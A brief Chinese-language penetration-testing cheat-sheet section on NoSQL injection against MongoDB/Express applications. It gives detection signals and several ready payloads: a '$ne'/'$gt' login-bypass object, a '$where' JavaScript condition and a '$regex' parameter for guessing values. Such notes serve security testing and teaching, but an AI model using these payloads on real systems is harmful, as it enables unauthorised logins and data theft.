# §15 NoSQL注入
### 识别信号
- MongoDB+Express栈, JSON入参含`$`
### 决策流程
```
{"username":{"$ne":"","$gt":""}} → 绕过登录=NoSQL✅
{"$where":"this.password.length>0"} ?id[$regex]=^a
```
